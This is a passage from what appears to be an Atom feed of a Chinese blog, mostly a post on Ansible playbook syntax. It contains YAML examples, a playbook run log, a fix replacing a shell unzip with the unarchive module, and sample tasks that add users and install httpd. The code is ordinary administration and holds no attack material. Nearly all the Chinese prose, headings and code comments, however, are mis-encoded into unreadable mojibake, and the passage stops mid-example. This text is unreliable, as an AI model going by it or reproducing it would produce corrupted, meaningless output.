&lt;p&gt;è¿™ä¸ªæ˜¯è‡ªåŠ¨åŒ–é‡Œé¢æœ€å¸¸è§çš„éƒ¨ç½²è‡ªåŠ¨åŒ–ï¼Œå¯¹äºITILçš„æµç¨‹å°±æ˜¯å‘å¸ƒä¸éƒ¨ç½²ç®¡ç†ã€‚&lt;br&gt;&lt;code&gt;æ„å»º---æ‰“åŒ…---æµ‹è¯•---å‘å¸ƒ&lt;/code&gt;éƒ½éœ€è¦æ˜¯è‡ªåŠ¨çš„ï¼›æ‰€ä»¥è¿™å—éœ€è¦æµ‹è¯•çš„æ”¯æŒã€‚éœ€è¦æœ‰è‡ªåŠ¨åŒ–æµ‹è¯•ã€‚æ²¡æœ‰å°±å¡åˆ°æµ‹è¯•äº†ã€‚&lt;br&gt;æœ€ç®€å•çš„å°±æ˜¯å‘å¸ƒæµç¨‹å’Œå¼€å‘æµç¨‹åˆ†å¼€ã€‚&lt;/p&gt;
&lt;p&gt;è‡ªåŠ¨åŒ–è¿ç»´å‡è½»äº†å¾ˆå¤šçš„äº‹æƒ…ï¼Œä¹Ÿè®©æ›´å¤šçš„è¿ç»´å°ä¼™ä¼´å¯ä»¥ç ”ç©¶æ›´å¤šçš„çŸ¥è¯†ã€‚&lt;br&gt;è¿™ç¯‡æ–‡ç« ä¹Ÿæ˜¯è‡ªå·±å¯¹è¿™ä¸¤å¹´å¤šè¿ç»´çš„è¿™ä¸€æ–¹é¢çš„è‡ªåŠ¨åŒ–è¿ç»´çš„æ€»ç»“ã€‚&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;è¿ç»´è‡ªåŠ¨åŒ–ä¸ªäººæ€»ç»“-è®°å½•è‡ªå·±è‡ªåŠ¨åŒ–è¿ç»´æŠ€æœ¯æå‡ğŸ‘&quot;&gt;&lt;a href=&quot;#è¿ç»´è‡ªåŠ¨åŒ–ä¸ªäººæ€»ç»“-è®°å½•è‡ªå·±è‡ªåŠ¨åŒ–è¿ç»´æŠ€æœ¯æå‡ğŸ‘&quot; class=&quot;headerlink&quot; title=&quot;è¿ç»´è‡ªåŠ¨åŒ–ä¸ªäººæ€»ç»“-è®°å½•è‡ªå·±è‡ªåŠ¨åŒ–è¿ç»´æŠ€æœ¯æå‡ğŸ‘&quot;&gt;&lt;/a&gt;è¿ç»´è‡ªåŠ¨åŒ–ä¸ªäººæ€»ç»“-è®°
    
    </summary>
    
      <category term="automation" scheme="http://blog.yangcvo.me/categories/automation/"/>
    
    
      <category term="Automation" scheme="http://blog.yangcvo.me/tags/Automation/"/>
    
  </entry>
  
  <entry>
    <title>Ansible-Playbooké«˜çº§è¯­æ³•è¿ç”¨</title>
    <link href="http://blog.yangcvo.me/2017/02/10/%E8%87%AA%E5%8A%A8%E5%8C%96+%E5%8F%AF%E8%A7%86%E5%8C%96/Ansible/Ansible-Playbook%E9%AB%98%E7%BA%A7%E8%AF%AD%E6%B3%95%E8%BF%90%E7%94%A8/"/>
    <id>http://blog.yangcvo.me/2017/02/10/è‡ªåŠ¨åŒ–+å¯è§†åŒ–/Ansible/Ansible-Playbooké«˜çº§è¯­æ³•è¿ç”¨/</id>
    <published>2017-02-10T09:56:03.000Z</published>
    <updated>2017-03-23T14:52:47.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;Ansible-å®˜ç½‘å­¦ä¹ ï¼š&quot;&gt;&lt;a href=&quot;#Ansible-å®˜ç½‘å­¦ä¹ ï¼š&quot; class=&quot;headerlink&quot; title=&quot;Ansible å®˜ç½‘å­¦ä¹ ï¼š&quot;&gt;&lt;/a&gt;Ansible å®˜ç½‘å­¦ä¹ ï¼š&lt;/h3&gt;&lt;p&gt;å…è´¹ä¸‹è½½çš„ANSIBLE WHITEPAPER  &lt;a href=&quot;https://www.ansible.com/ansible-in-depth-whitepaper&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ansibleé«˜çº§ç™½çš®ä¹¦&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Ansibleç®€ä»‹, &lt;a href=&quot;https://fast.wistia.net/embed/iframe/p1oo1n6jtv?popover=true&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;111åˆ†é’Ÿçš„å­¦ä¹ è§†é¢‘å®˜ç½‘&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Ansibleè‡ªåŠ¨åŒ–å¹³å°æ¼”ç¤º,&lt;a href=&quot;https://fast.wistia.net/embed/iframe/xi5453qdhl?popover=true&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;æ¼”ç¤º&lt;/a&gt;&lt;/p&gt;
&lt;h4 id=&quot;æˆ‘åœ¨å®˜ç½‘å­¦ä¹ ğŸ“šä¹¦ç±-ï¼Œè¿™é‡Œä¹Ÿæ˜¯å®˜ç½‘æ¨èæˆ‘è´´äº†3æœ¬ï¼Œéœ€è¦è‡ªå·±å»ä¸‹è½½ï¼š&quot;&gt;&lt;a href=&quot;#æˆ‘åœ¨å®˜ç½‘å­¦ä¹ ğŸ“šä¹¦ç±-ï¼Œè¿™é‡Œä¹Ÿæ˜¯å®˜ç½‘æ¨èæˆ‘è´´äº†3æœ¬ï¼Œéœ€è¦è‡ªå·±å»ä¸‹è½½ï¼š&quot; class=&quot;headerlink&quot; title=&quot;æˆ‘åœ¨å®˜ç½‘å­¦ä¹ ğŸ“šä¹¦ç± ï¼Œè¿™é‡Œä¹Ÿæ˜¯å®˜ç½‘æ¨èæˆ‘è´´äº†3æœ¬ï¼Œéœ€è¦è‡ªå·±å»ä¸‹è½½ï¼š&quot;&gt;&lt;/a&gt;æˆ‘åœ¨å®˜ç½‘å­¦ä¹ ğŸ“šä¹¦ç± ï¼Œè¿™é‡Œä¹Ÿæ˜¯å®˜ç½‘æ¨èæˆ‘è´´äº†3æœ¬ï¼Œéœ€è¦è‡ªå·±å»ä¸‹è½½ï¼š&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;Ansible for DevOps, by Jeff Geerling&lt;br&gt;&lt;a href=&quot;https://www.ansible.com/ansible-devops-book&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;FREE BOOK SAMPLE&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Extending Ansible eBook Preview , Extending Ansible  ,by Rishabh Das&lt;br&gt;&lt;a href=&quot;https://www.ansible.com/extending-ansible&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;FREE BOOK SAMPLE&lt;/a&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Mastering Ansible ebook , Mastering Ansible , by Jesse Keating&lt;br&gt;&lt;a href=&quot;https://www.ansible.com/mastering-ansible-jesse-keating&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;FREE BOOK SAMPLE&lt;/a&gt; &lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;è¿™é‡Œæˆ‘ä¸»è¦åº”ç”¨åˆ°&lt;code&gt;Ansible-Playbook&lt;/code&gt; æ¯”è¾ƒå¤šï¼Œä¸€å¼€å§‹å­¦ansibleæ˜¯å› ä¸ºè¿ç»´è¿™å—éœ€è¦ç”¨åˆ°è‡ªåŠ¨åŒ–ï¼Œä»¥å‰è‡ªåŠ¨åŒ–å‘å¸ƒç­‰ç­‰éƒ½æ˜¯ç”¨shell,pythonå¤æ‚æ€§çš„å»å®Œæˆï¼Œshellå»å®ç°éƒ¨ç½²ä¸€ä¸ªç¯å¢ƒï¼Œè¦å®Œæˆå¤šå°æœºå™¨ä¹‹å‰é‡‡ç”¨ï¼Œsaltå»å®ç°æ•ˆæœï¼Œå‘ç°åœ¨å…¬å¸ä¸€ä¸ªå¤§å‹çš„æ¶æ„æ¼”å˜saltæ”¯æ’‘ä¸äº†ï¼Œè€Œä¸”éœ€è¦ç½‘ç»œç¨³å®šæ€§é«˜ï¼Œä»–ä»¬çš„è‡ªåŠ¨åŒ–æ§åˆ¶æ˜¯ç”¨agentå»æ§åˆ¶çš„ï¼Œéœ€è¦æ§åˆ¶çš„æœºå™¨éƒ½è¦ä¿®æ”¹å’Œé…ç½®å®‰è£…agent,ansbileå°±ä¸éœ€è¦ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨Ansibleä¸­ï¼Œæˆ‘ä»¬å°±å……å½“ç¼–å‰§çš„è§’è‰²ï¼Œäº²è‡ªç¼–å†™å‰§æœ¬ï¼ˆä¸€ç³»åˆ—çš„æœåŠ¡å™¨æ“ä½œï¼‰ï¼Œè®©ä¸€å‡ºå‡ºç²¾å½©çš„æˆå‰§ï¼ˆplayï¼‰å·§å¦™é…åˆï¼Œå®Œæˆå¯¹æœåŠ¡å™¨çš„ä¸€ç³»åˆ—ç²¾ç¡®æ§åˆ¶ã€‚&lt;/p&gt;
&lt;h3 id=&quot;1-1-Playbookè¯­æ³•ç®€ä»‹&quot;&gt;&lt;a href=&quot;#1-1-Playbookè¯­æ³•ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;1.1 Playbookè¯­æ³•ç®€ä»‹&quot;&gt;&lt;/a&gt;1.1 Playbookè¯­æ³•ç®€ä»‹&lt;/h3&gt;&lt;p&gt;Playbooké‡‡ç”¨ä¸€ç§å¯è¯»æ€§å¾ˆé«˜çš„ä¸”å®¹æ˜“è¢«äººç±»é˜…è¯»çš„è¯­æ³•çš„YAMLè¯­æ³•ç¼–å†™ï¼Œ&lt;code&gt;YAML: &amp;quot;YAML Ain&amp;#39;t a Markup Language&amp;quot;&lt;/code&gt;ï¼ˆYAMLä¸æ˜¯ä¸€ç§ç½®æ ‡è¯­è¨€ï¼‰ã€‚è¯¥è¯­è¨€åœ¨è¢«å¼€å‘æ—¶ï¼ŒYAML çš„æ„æ€å…¶å®æ˜¯ï¼šâ€Yet Another Markup Languageâ€ï¼ˆä»æ˜¯ä¸€ç§ç½®æ ‡è¯­è¨€ï¼‰ï¼Œæ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;house:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  family:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    name: Doe&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    parents:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      - John&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      - Jane&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    children:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      - Paul&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      - Mark&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      - Simone&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  address:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    number: 34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    street: Main Street&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    city: Nowheretown&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  zipcode: 12345&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;è¿™é‡Œè¯­æ³•æŠ¥é”™æœ‰çš„å¦‚æœæŒ‰shellè„šæœ¬ç›´æ¥å»å†™çš„è¯å°±ä¼šå‡ºé”™ï¼š&lt;/p&gt;
&lt;p&gt;æŠ¥é”™ï¼š &lt;code&gt;[WARNING]: Consider using unarchive module rather than running unzip&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ansible_01 ~]&lt;span class=&quot;comment&quot;&gt;# ansible-playbook famly.yml&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;---&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PLAY [all] *********************************************************************&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;TASK [setup] *******************************************************************&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ok: [192.168.1.209]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;TASK [copy-war-file] ***********************************************************&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ok: [192.168.1.209]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;TASK [unzip war.] **************************************************************&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;changed: [192.168.1.209]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; [WARNING]: Consider using unarchive module rather than running unzip&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;PLAY RECAP *********************************************************************&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;192.168.1.209              : ok=3    changed=1    unreachable=0    failed=0&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;åŸè¿™é‡Œfamly.ymlå†™è¿™é‡Œè§£å‹æ­¥éª¤ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;- name : è§£å‹/root/java_war/api.waråŒ…åœ¨/home/app/newwar/apiç›®å½•&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   shell : unzip -oq &amp;#123;&amp;#123; famly_war &amp;#125;&amp;#125;  &lt;span class=&quot;_&quot;&gt;-d&lt;/span&gt; &amp;#123;&amp;#123; app_war &amp;#125;&amp;#125;/webapps/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ä¿®æ”¹ä»¥åï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;- name: unzip war.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  unarchive: src=/root/java_war/haozhuo-family.war dest=/srv/&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ç»è¿‡ä»¥ä¸Šæ›´æ”¹åï¼Œè½¯ä»¶åŒ…å¯ä»¥æ­£å¸¸åœ¨clientè§£å‹ï¼Œä¸å†æŠ¥é”™ã€‚&lt;/p&gt;
&lt;h3 id=&quot;2ã€ç‰¹ç‚¹&quot;&gt;&lt;a href=&quot;#2ã€ç‰¹ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;2ã€ç‰¹ç‚¹&quot;&gt;&lt;/a&gt;2ã€ç‰¹ç‚¹&lt;/h3&gt;&lt;p&gt;YAMLçš„å¯è¯»æ€§å¥½&lt;/p&gt;
&lt;p&gt;YAMLå’Œè„šæœ¬è¯­è¨€çš„äº¤äº’æ€§å¥½&lt;/p&gt;
&lt;p&gt;YAMLä½¿ç”¨å®ç°è¯­è¨€çš„æ•°æ®ç±»å‹&lt;/p&gt;
&lt;p&gt;YAMLæœ‰ä¸€ä¸ªä¸€è‡´çš„ä¿¡æ¯æ¨¡å‹&lt;/p&gt;
&lt;p&gt;YAMLæ˜“äºå®ç°&lt;/p&gt;
&lt;p&gt;YAMLå¯ä»¥åŸºäºæµæ¥å¤„ç†&lt;/p&gt;
&lt;p&gt;YAMLè¡¨è¾¾èƒ½åŠ›å¼ºï¼Œæ‰©å±•æ€§å¥½&lt;/p&gt;
&lt;p&gt;YAMLçš„è¯­æ³•å’Œå…¶ä»–é«˜é˜¶è¯­è¨€ç±»ä¼¼ï¼Œå¹¶ä¸”å¯ä»¥ç®€å•è¡¨è¾¾æ¸…å•ã€æ•£åˆ—è¡¨ã€æ ‡é‡ç­‰æ•°æ®ç»“æ„ã€‚å…¶ç»“æ„ï¼ˆStructureï¼‰é€šè¿‡ç©ºæ ¼æ¥å±•ç¤ºï¼Œåºåˆ—ï¼ˆSequenceï¼‰é‡Œçš„é¡¹ç”¨â€-â€œæ¥ä»£è¡¨ï¼ŒMapé‡Œçš„é”®å€¼å¯¹ç”¨â€:â€åˆ†éš”ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;- hosts: 10.1.0.1        &lt;span class=&quot;comment&quot;&gt;#å®šä¹‰ä¸»æœº&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  vars:                      &lt;span class=&quot;comment&quot;&gt;#å®šä¹‰å˜é‡&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       var1: value&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       var2: value&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  tasks:                    &lt;span class=&quot;comment&quot;&gt;#å®šä¹‰ä»»åŠ¡&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       - name:           &lt;span class=&quot;comment&quot;&gt;#ä»»åŠ¡åç§°ã€‚&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   &lt;span class=&quot;comment&quot;&gt;#è¿™é‡Œå°±å¯ä»¥å¼€å§‹ç”¨æ¨¡å—æ¥æ‰§è¡Œå…·ä½“çš„ä»»åŠ¡äº†ã€‚&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  handlers:     &lt;span class=&quot;comment&quot;&gt;#å®šä¹‰è§¦å‘é€šçŸ¥æ‰€ä½œçš„æ“ä½œã€‚é‡Œé¢ä¹Ÿæ˜¯è·Ÿtasksä¸€æ ·ï¼Œç”¨æ¨¡å—å®šä¹‰ä»»åŠ¡ã€‚&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;       - name:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  remote_user:             &lt;span class=&quot;comment&quot;&gt;#è¿œç¨‹ä¸»æœºæ‰§è¡Œä»»åŠ¡æ—¶çš„ç”¨æˆ·ã€‚ä¸€èˆ¬éƒ½æ˜¯rootï¼Œä¸€èˆ¬ä¹Ÿä¸ç”¨æŒ‡å®šã€‚&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;- hosts: web&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  vars:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  tasks:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  handlers:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  remote_user:&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;YAMLæ–‡ä»¶æ‰©å±•åé€šå¸¸ä¸º&lt;code&gt;.yamlï¼Œå¦‚family.yaml&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;2-playbookçš„åŸºç¡€ç»„ä»¶ï¼š&quot;&gt;&lt;a href=&quot;#2-playbookçš„åŸºç¡€ç»„ä»¶ï¼š&quot; class=&quot;headerlink&quot; title=&quot;2.playbookçš„åŸºç¡€ç»„ä»¶ï¼š&quot;&gt;&lt;/a&gt;2.playbookçš„åŸºç¡€ç»„ä»¶ï¼š&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Hostsï¼šè¿è¡ŒæŒ‡å®šä»»åŠ¡çš„ç›®æ ‡ä¸»æœºï¼›&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;remote_userï¼šåœ¨è¿œç¨‹ä¸»æœºä»¥å“ªä¸ªç”¨æˆ·èº«ä»½æ‰§è¡Œï¼›&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    sudo_userï¼šéç®¡ç†å‘˜éœ€è¦æ‹¥æœ‰sudoæƒé™ï¼›&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;tasksï¼šä»»åŠ¡åˆ—è¡¨&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    æ¨¡å—ï¼Œæ¨¡å—å‚æ•°ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        æ ¼å¼ï¼š&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            (1) action: module arguments&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            (2) module: arguments&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ç¤ºä¾‹1ï¼š&lt;br&gt;&lt;img src=&quot;http://7xrthw.com1.z0.glb.clouddn.com/ansible_23.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;vim test.yaml ä¹Ÿå¯ä»¥æ˜¯ .yml&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;- hosts: tomcat_01   &lt;span class=&quot;comment&quot;&gt;#è¿è¡ŒæŒ‡å®šä»»åŠ¡çš„ç›®æ ‡ä¸»æœºï¼›&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  remote_user: root   &lt;span class=&quot;comment&quot;&gt;#åœ¨è¿œç¨‹ä¸»æœºä»¥å“ªä¸ªç”¨æˆ·èº«ä»½æ‰§è¡Œï¼›root&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  tasks:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: install a group   &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   group: name=mygrp system=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  - name: install a user&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    user: name=user1 group=mygrp system=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;   &lt;span class=&quot;comment&quot;&gt;# è¿™é‡Œ-name: graoup: éƒ½è¦å¯¹é½ï¼Œä¸ç„¶ä¼šæç¤ºè¯­æ³•å‡ºé”™ã€‚&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt; - hosts: websrvs      &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   remote_user: root&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;   tasks:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    - name: install httpd package&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      yum: name=httpd&lt;/div&gt;&lt;div 